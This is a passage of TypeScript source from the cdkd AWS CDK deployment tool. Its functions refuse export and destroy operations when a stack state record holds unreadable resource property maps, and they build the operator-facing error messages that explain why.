      `${proseQuoted(cdkdRemedy('cdkd import', '--force'))}, which records the properties resolved from the template; then ` +
      `export again.`,
    stackName,
    region,
    recovery,
    EXPORT_LEGACY_LEAD
  );
}

/**
 * For `cdkd export`: refuse a record whose resource entries carry a
 * `properties` map that cannot be read (issue
 * [#3315](https://github.com/go-to-k/cdkd/issues/3315), the export half).
 *
 * The same predicate as {@link refuseMalformedResourceProperties}; a separate
 * entry point for the MESSAGE and nothing else. REFUSE rather than repair: the
 * export is write-capable — it pre-deletes AWS resources in phase 2 and
 * deletes the record at the end — and a repaired `{}` feeds the same wrong
 * reads as the torn map does.
 *
 * CALL IT AT THE LOAD, after {@link refuseMalformedResourcesForExport} (an
 * unreadable bag yields `[]` here, so the order only decides which text an
 * operator sees first): at the root state load and over every node of a
 * nested tree, above `buildImportPlan`, whose reads it dominates.
 */
export function refuseMalformedResourcePropertiesForExport(
  state: StackState,
  stackName: string | undefined,
  region: string | undefined,
  recovery?: LockRecoveryContext
): void {
  const unreadable = unreadableResourcePropertyBags(state);
  if (unreadable.length === 0) return;
  // NOT `markNonRetryable`, for the reason `refuseMalformedResourcesForExport`
  // gives: raised from the command's own flow, outside any `withRetry` (at the
  // root load before any lock; for a nested node, under the root lock). Named
  // in the test file's UNMARKED table.
  throw new CdkdError(
    malformedExportResourcePropertiesRefusalMessage(stackName, region, unreadable, recovery),
    STATE_RESOURCES_MALFORMED
  );
}

/**
 * For the destroy runner (`cdkd destroy`, `cdkd state destroy`, a nested
 * child's destroy): refuse a record naming the resources whose `properties`
 * map cannot be read (go-to-k/cdkd#3211).
 *
 * The runner hands each record's map to `provider.delete`, and what a delete
 * DOES is read off it: `effectiveDeletionPolicy` decides an RDS DB instance's
 * final snapshot from `DBClusterIdentifier`, the ECR provider empties a
 * repository on `EmptyOnDelete` or the auto-delete tag, and
 * `countProtectedResources` sizes the `--remove-protection` prompt from it.
 * The delete ORDER is built from it too: the runner's dependency graph reads
 * each row's `Ref` / `Fn::GetAtt` edges out of the map, so a torn one drops
 * them silently — which is why a RETAINED row's map is refused as well.
 * A torn map reaches the provider verbatim, and reading it as EMPTY is not the
 * safe half: every one of those keys then reads as ABSENT, so the delete
 * fails or takes the wrong branch — after every resource ordered before it was
 * already deleted. REFUSE, the verdict every write-capable caller of
 * {@link unreadableResourcePropertyBags} takes.
 *
 * CALL IT AT THE LOAD, after {@link refuseMalformedResourceEntriesForDestroy}:
 * a typeless object with a torn map is named by both, and the entry text is
 * the more precise one.
 *
 * `markNonRetryable` for the reason its entry twin carries it.
 */
export function refuseMalformedResourcePropertiesForDestroy(
  state: StackState,
  stackName: string,
  region: string,
  /** See {@link malformedDestroyResourcePropertiesRefusalMessage}. */
  recovery?: LockRecoveryContext
): void {
  const unreadable = unreadableResourcePropertyBags(state);
  if (unreadable.length === 0) return;
  throw markNonRetryable(
    new CdkdError(
      malformedDestroyResourcePropertiesRefusalMessage(stackName, region, unreadable, recovery),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * The text {@link refuseMalformedResourcePropertiesForDestroy} raises. Its own
 * text: the deploy one describes a diff's REPLACEMENT verdict, which a destroy
 * never computes. Ends on the read command, as its entry twin does.
 */
export function malformedDestroyResourcePropertiesRefusalMessage(
  rawStackName: string,
  rawRegion: string,
  logicalIds: readonly string[],
  /** The caller's account flags, carried by the inspect command (go-to-k/cdkd#3909). */
  recovery?: LockRecoveryContext
): string {
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${namedPropertyBagsDiagnosis(stackName, region, logicalIds)} 'cdkd destroy' hands that map ` +
    `to the resource's delete, which reads keys off it — whether an RDS DB instance takes a ` +
    `final snapshot, whether an ECR repository is emptied first — so it refuses rather than ` +
    `continuing: the provider would get the torn value as it stands, and reading the map as ` +
    `EMPTY answers each of those keys as absent, a delete that fails or takes the wrong branch ` +
    `after every resource ordered before it was deleted. Nothing was deleted or written FOR ` +
    `THIS STACK. Repair the map first; 'cdkd state orphan' drops the whole record with every ` +
    `resource left standing, which is more than this asks for. ` +
    `${inspectClause(stackName, region, recovery)}Inspect the record with: ` +
    inspectCommand(stackName, region, recovery)
  );
}
